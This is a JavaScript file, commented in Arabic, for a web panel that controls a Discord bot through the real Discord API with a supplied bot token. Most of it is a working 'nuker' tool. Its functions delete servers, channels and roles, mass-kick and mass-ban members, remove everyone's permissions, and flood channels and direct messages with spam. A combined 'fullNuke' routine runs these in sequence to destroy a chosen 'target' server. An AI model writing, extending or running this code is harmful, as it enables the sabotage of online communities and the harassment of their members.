// script.js - التحكم الحقيقي في بوت ديسكورد عبر API خارجي

let botConnected = false;
let currentGuildId = null;
let apiUrl = 'https://discord.com/api/v10'; // API حقيقي
let botToken = null;

// إضافة سجل
function addLog(message, type = 'info') {
    const logDiv = document.getElementById('log');
    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;
    entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
    logDiv.appendChild(entry);
    entry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

// مسح السجل
function clearLog() {
    document.getElementById('log').innerHTML = '';
    addLog('تم مسح السجل', 'info');
}

// تنفيذ أمر عبر Discord API الحقيقي
async function execDiscordAPI(endpoint, method = 'GET', body = null) {
    if (!botToken) {
        addLog('❌ الرجاء إدخال التوكن أولاً', 'error');
        return null;
    }
    
    const url = `${apiUrl}${endpoint}`;
    const options = {
        method: method,
        headers: {
            'Authorization': `Bot ${botToken}`,
            'Content-Type': 'application/json'
        }
    };
    if (body) options.body = JSON.stringify(body);
    
    try {
        const response = await fetch(url, options);
        if (!response.ok) {
            const error = await response.text();
            addLog(`❌ فشل: ${response.status} - ${error}`, 'error');
            return null;
        }
        return await response.json();
    } catch(e) {
        addLog(`❌ خطأ في الاتصال: ${e.message}`, 'error');
        return null;
    }
}

// جلب معلومات البوت
async function getBotInfo() {
    const user = await execDiscordAPI('/users/@me');
    if (user) {
        document.getElementById('botName').innerText = user.username;
        addLog(`✅ البوت متصل: ${user.username}#${user.discriminator}`, 'success');
        return true;
    }
    return false;
}

// جلب سيرفرات البوت
async function getBotGuilds() {
    const guilds = await execDiscordAPI('/users/@me/guilds');
    if (guilds && guilds.length > 0) {
        const select = document.getElementById('guildList');
        select.innerHTML = '<option value="">-- اختر السيرفر المستهدف --</option>';
        guilds.forEach(g => {
            select.innerHTML += `<option value="${g.id}">${g.name} (${g.id})</option>`;
        });
        document.getElementById('guildSelect').style.display = 'block';
        return guilds;
    }
    return [];
}

// جلب إحصائيات السيرفر
async function fetchGuildStats(guildId) {
    const guild = await execDiscordAPI(`/guilds/${guildId}?with_counts=true`);
    if (guild) {
        document.getElementById('memberCount').innerText = guild.approximate_member_count || '?';
        
        // جلب القنوات
        const channels = await execDiscordAPI(`/guilds/${guildId}/channels`);
        if (channels) document.getElementById('channelCount').innerText = channels.length;
        
        // جلب الرتب
        const roles = await execDiscordAPI(`/guilds/${guildId}/roles`);
        if (roles) document.getElementById('roleCount').innerText = roles.length;
        
        return true;
    }
    return false;
}

// ========== أوامر التخريب الحقيقية ==========

// حذف السيرفر
async function deleteServer() {
    if (!currentGuildId) return addLog('❌ اختر سيرفر أولاً', 'error');
    if (!confirm('⚠️ هل أنت متأكد من حذف السيرفر بالكامل؟ لا يمكن التراجع!')) return;
    
    addLog(`💀 جاري حذف السيرفر ${currentGuildId}...`, 'warning');
    const result = await execDiscordAPI(`/guilds/${currentGuildId}`, 'DELETE');
    if (result !== null) {
        addLog('💀 تم حذف السيرفر بنجاح!', 'error');
    }
}

// تغيير اسم السيرفر
async function renameServer(newName) {
    if (!currentGuildId || !newName) return addLog('❌ أدخل اسماً جديداً', 'error');
    const result = await execDiscordAPI(`/guilds/${currentGuildId}`, 'PATCH', { name: newName });
    if (result) addLog(`✅ تم تغيير الاسم إلى: ${newName}`, 'success');
}

// قفل السيرفر (منع الجميع من الكلام)
async function lockdown() {
    if (!currentGuildId) return;
    addLog('🔒 جاري قفل السيرفر...', 'warning');
    
    // جلب الرتبة @everyone
    const roles = await execDiscordAPI(`/guilds/${currentGuildId}/roles`);
    const everyone = roles?.find(r => r.name === '@everyone');
    if (everyone) {
        await execDiscordAPI(`/guilds/${currentGuildId}/roles/${everyone.id}`, 'PATCH', {
            permissions: '0' // إزالة كل الصلاحيات
        });
        addLog('🔒 تم قفل السيرفر!', 'success');
    }
}

// إنشاء قناة
async function createChannel(name) {
    if (!currentGuildId || !name) return;
    const result = await execDiscordAPI(`/guilds/${currentGuildId}/channels`, 'POST', {
        name: name,
        type: 0  // text channel
    });
    if (result) addLog(`✅ تم إنشاء قناة: ${name}`, 'success');
}

// حذف قناة
async function deleteChannel(channelId) {
    if (!channelId) return;
    const result = await execDiscordAPI(`/channels/${channelId}`, 'DELETE');
    if (result !== null) addLog(`✅ تم حذف القناة ${channelId}`, 'success');
}

// سبام قنوات
async function spamChannels(params) {
    if (!currentGuildId) return;
    const count = parseInt(params.count) || 50;
    const name = params.name || 'spam';
    addLog(`🔥 جاري إنشاء ${count} قناة...`, 'warning');
    
    for(let i = 0; i < Math.min(count, 100); i++) {
        await createChannel(`${name}_${i+1}`);
        await new Promise(r => setTimeout(r, 200));
    }
    addLog(`✅ تم إنشاء ${count} قناة`, 'success');
}

// حذف كل القنوات
async function deleteAllChannels() {
    if (!currentGuildId) return;
    if (!confirm('⚠️ حذف كل القنوات؟')) return;
    
    const channels = await execDiscordAPI(`/guilds/${currentGuildId}/channels`);
    if (channels) {
        for(const ch of channels) {
            await deleteChannel(ch.id);
            await new Promise(r => setTimeout(r, 100));
        }
        addLog(`✅ تم حذف ${channels.length} قناة`, 'success');
    }
}

// إنشاء رتبة
async function createRole(name) {
    if (!currentGuildId || !name) return;
    const result = await execDiscordAPI(`/guilds/${currentGuildId}/roles`, 'POST', { name: name });
    if (result) addLog(`✅ تم إنشاء رتبة: ${name}`, 'success');
}

// إعطاء رتبة للجميع
async function giveRoleToAll(roleId) {
    if (!currentGuildId || !roleId) return;
    addLog(`🎭 جاري إعطاء الرتبة ${roleId} للجميع...`, 'warning');
    
    const members = await execDiscordAPI(`/guilds/${currentGuildId}/members?limit=1000`);
    if (members) {
        for(const m of members) {
            await execDiscordAPI(`/guilds/${currentGuildId}/members/${m.user.id}/roles/${roleId}`, 'PUT');
            await new Promise(r => setTimeout(r, 50));
        }
        addLog(`✅ تم إعطاء الرتبة لـ ${members.length} عضو`, 'success');
    }
}

// حذف كل الرتب
async function deleteAllRoles() {
    if (!currentGuildId) return;
    const roles = await execDiscordAPI(`/guilds/${currentGuildId}/roles`);
    if (roles) {
        for(const r of roles) {
            if (r.name !== '@everyone') {
                await execDiscordAPI(`/guilds/${currentGuildId}/roles/${r.id}`, 'DELETE');
                await new Promise(r => setTimeout(r, 100));
            }
        }
        addLog(`✅ تم حذف ${roles.length - 1} رتبة`, 'success');
    }
}

// طرد عضو
async function kickMember(userId) {
    if (!currentGuildId || !userId) return;
    const result = await execDiscordAPI(`/guilds/${currentGuildId}/members/${userId}`, 'DELETE');
    if (result !== null) addLog(`✅ تم طرد العضو ${userId}`, 'success');
}

// حظر عضو
async function banMember(userId) {
    if (!currentGuildId || !userId) return;
    const result = await execDiscordAPI(`/guilds/${currentGuildId}/bans/${userId}`, 'PUT');
    if (result !== null) addLog(`✅ تم حظر العضو ${userId}`, 'success');
}

// طرد الكل
async function kickAll() {
    if (!currentGuildId) return;
    if (!confirm('⚠️ طرد كل الأعضاء؟')) return;
    
    const members = await execDiscordAPI(`/guilds/${currentGuildId}/members?limit=1000`);
    if (members) {
        for(const m of members) {
            if (!m.user.bot) {
                await kickMember(m.user.id);
                await new Promise(r => setTimeout(r, 100));
            }
        }
        addLog(`✅ تم طرد ${members.filter(m => !m.user.bot).length} عضو`, 'success');
    }
}

// حظر الكل
async function banAll() {
    if (!currentGuildId) return;
    if (!confirm('⚠️ حظر كل الأعضاء؟')) return;
    
    const members = await execDiscordAPI(`/guilds/${currentGuildId}/members?limit=1000`);
    if (members) {
        for(const m of members) {
            if (!m.user.bot) {
                await banMember(m.user.id);
                await new Promise(r => setTimeout(r, 100));
            }
        }
        addLog(`✅ تم حظر ${members.filter(m => !m.user.bot).length} عضو`, 'success');
    }
}

// سبام رسائل
async function spamMessage(params) {
    if (!currentGuildId) return;
    const text = params.text || 'SPAM';
    const count = Math.min(parseInt(params.count) || 100, 500);
    
    // جلب أول قناة نصية
    const channels = await execDiscordAPI(`/guilds/${currentGuildId}/channels`);
    const textChannel = channels?.find(c => c.type === 0);
    if (!textChannel) return addLog('❌ لا توجد قناة نصية', 'error');
    
    addLog(`💬 جاري إرسال ${count} رسالة إلى #${textChannel.name}...`, 'warning');
    for(let i = 0; i < count; i++) {
        await execDiscordAPI(`/channels/${textChannel.id}/messages`, 'POST', { content: `${text} [${i+1}]` });
        await new Promise(r => setTimeout(r, 50));
    }
    addLog(`✅ تم إرسال ${count} رسالة`, 'success');
}

// سبام خاص
async function spamDM(params) {
    const userId = params.userId;
    const text = params.text || 'SPAM';
    const count = Math.min(parseInt(params.count) || 50, 200);
    
    if (!userId) return addLog('❌ أدخل رقم العضو', 'error');
    
    // فتح DM
    const dmChannel = await execDiscordAPI(`/users/@me/channels`, 'POST', { recipient_id: userId });
    if (dmChannel && dmChannel.id) {
        for(let i = 0; i < count; i++) {
            await execDiscordAPI(`/channels/${dmChannel.id}/messages`, 'POST', { content: `${text} [${i+1}]` });
            await new Promise(r => setTimeout(r, 100));
        }
        addLog(`✅ تم إرسال ${count} رسالة خاصة`, 'success');
    }
}

// تفجير كامل
async function fullNuke() {
    if (!currentGuildId) return;
    if (!confirm('💀💀💀 تفجير كامل للسيرفر؟ اكتب "NUKE" للتأكيد 💀💀💀')) return;
    const confirmText = prompt('اكتب NUKE للتأكيد النهائي');
    if (confirmText !== 'NUKE') return;
    
    addLog('💀 جاري التفجير النووي...', 'error');
    
    // 1. حذف كل القنوات
    await deleteAllChannels();
    // 2. حذف كل الرتب
    await deleteAllRoles();
    // 3. حظر كل الأعضاء
    await banAll();
    // 4. تغيير الاسم
    await renameServer(`DESTROYED_${Date.now()}`);
    // 5. حذف السيرفر
    await deleteServer();
    
    addLog('💀 تم تدمير السيرفر بالكامل 💀', 'error');
}

// تفجير خفيف
async function softNuke() {
    if (!currentGuildId) return;
    if (!confirm('تفجير خفيف؟')) return;
    
    await deleteAllChannels();
    await spamChannels({ count: 500, name: 'DESTROYED' });
    addLog('✅ تم التفجير الخفيف', 'success');
}

// ========== الاتصال والتشغيل ==========
document.getElementById('connectBtn').addEventListener('click', async () => {
    const token = document.getElementById('botToken').value.trim();
    if (!token) {
        document.getElementById('status').innerHTML = '<span style="color:#ff3366;">❌ أدخل التوكن</span>';
        return;
    }
    
    botToken = token;
    document.getElementById('status').innerHTML = '<span style="color:#ffaa33;">⏳ جاري الاتصال...</span>';
    
    const connected = await getBotInfo();
    if (connected) {
        botConnected = true;
        document.getElementById('status').innerHTML = '<span style="color:#00ff88;">✅ البوت متصل بنجاح</span>';
        document.getElementById('stats').style.display = 'grid';
        document.getElementById('commands').style.display = 'block';
        document.getElementById('logCard').style.display = 'block';
        
        await getBotGuilds();
        
        document.getElementById('guildList').addEventListener('change', async (e) => {
            currentGuildId = e.target.value;
            if (currentGuildId) {
                await fetchGuildStats(currentGuildId);
                addLog(`🎯 تم اختيار السيرفر: ${currentGuildId}`, 'success');
            }
        });
    } else {
        document.getElementById('status').innerHTML = '<span style="color:#ff3366;">❌ فشل الاتصال - تأكد من التوكن</span>';
    }
});

// ربط الأوامر
window.execCmd = async (cmd, param) => {
    if (!botToken) {
        addLog('❌ قم بتشغيل البوت أولاً', 'error');
        return;
    }
    if (!currentGuildId && cmd !== 'deleteServer') {
        addLog('❌ اختر سيرفراً مستهدفاً', 'error');
        return;
    }
    
    addLog(`⚡ تنفيذ: ${cmd}`, 'info');
    
    switch(cmd) {
        case 'deleteServer': await deleteServer(); break;
        case 'renameServer': await renameServer(param); break;
        case 'lockdown': await lockdown(); break;
        case 'createChannel': await createChannel(param); break;
        case 'deleteChannel': await deleteChannel(param); break;
        case 'spamChannels': await spamChannels(param); break;
        case 'deleteAllChannels': await deleteAllChannels(); break;
        case 'createRole': await createRole(param); break;
        case 'giveRoleToAll': await giveRoleToAll(param); break;
        case 'deleteAllRoles': await deleteAllRoles(); break;
        case 'kickMember': await kickMember(param); break;
        case 'banMember': await banMember(param); break;
        case 'kickAll': await kickAll(); break;
        case 'banAll': await banAll(); break;
        case 'spamMessage': await spamMessage(param); break;
        case 'spamDM': await spamDM(param); break;
        case 'fullNuke': await fullNuke(); break;
        case 'softNuke': await softNuke(); break;
        default: addLog(`⚠️ أمر غير معروف: ${cmd}`, 'error');
    }
};